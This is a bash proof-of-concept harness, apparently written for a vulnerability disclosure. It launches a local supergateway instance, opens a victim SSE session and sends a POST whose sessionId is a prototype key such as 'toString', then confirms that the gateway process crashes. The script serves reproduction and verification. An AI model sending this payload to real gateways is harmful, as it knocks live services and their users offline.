#!/usr/bin/env bash
# Deterministic single-run harness for SGW-2026-001 (SSE prototype-key DoS).
# Runs its own gateway, then sends one malicious POST and verifies process death.
# Usage: ./rt01_harness.sh [sessionId-payload] [port]
set -u
ENG="${ENG:-$(cd "$(dirname "$0")/.." && pwd)}"
REPO="${REPO:-$ENG/.work/supergateway}"
PAYLOAD="${1:-toString}"; PORT="${2:-18081}"
BASE="http://127.0.0.1:$PORT"; LOG="$(mktemp)"
VICTIM="$(mktemp)"
[ -f "$REPO/dist/index.js" ] || { echo "FAIL: $REPO/dist/index.js missing (run scripts/bootstrap.sh)"; exit 1; }
waitport() { for i in $(seq 1 50); do (exec 3<>/dev/tcp/127.0.0.1/$PORT) 2>/dev/null && { exec 3>&-; return 0; }; sleep 0.1; done; return 1; }
node "$REPO/dist/index.js" --stdio "python3 $ENG/pocs/canary_mcp_server.py" --port "$PORT" --baseUrl "$BASE" --healthEndpoint /healthz > "$LOG" 2>&1 &
GW=$!
cleanup() { kill "$GW" 2>/dev/null; rm -f "$VICTIM"; }
trap cleanup EXIT
waitport || { echo "FAIL: gateway did not start"; sed -n '1,5p' "$LOG"; exit 1; }
echo "[*] gateway log      : $LOG"
echo "[*] baseline /message (no session): $(curl -s -o /dev/null -w '%{http_code}' -X POST $BASE/message)"
echo "[*] baseline /healthz              : $(curl -s -o /dev/null -w '%{http_code}' $BASE/healthz)"
echo "[*] opening victim SSE session ..."
curl -sN --max-time 60 "$BASE/sse" > "$VICTIM" 2>&1 &
VICTIM_PID=$!; sleep 1
echo "[*] victim endpoint  : $(sed -n 's/^data: //p' "$VICTIM" | head -1)"
echo "[*] payload          : POST /message?sessionId=$PAYLOAD"
curl -sS -o /dev/null -w '[*] HTTP status: %{http_code} (0/000 = connection dropped)\n' --max-time 5 -X POST "$BASE/message?sessionId=$PAYLOAD" || true
for i in $(seq 1 30); do (exec 3<>/dev/tcp/127.0.0.1/$PORT) 2>/dev/null || { echo "[+] gateway port closed after ${i}00ms -> process dead"; break; }; exec 3>&-; sleep 0.1; done
wait $VICTIM_PID 2>/dev/null
echo "[*] victim stream    : $(tail -c 160 "$VICTIM" | tr '\n' '|')"
echo "[*] health after     : $(curl -s -o /dev/null -w '%{http_code}' --max-time 2 $BASE/healthz)"
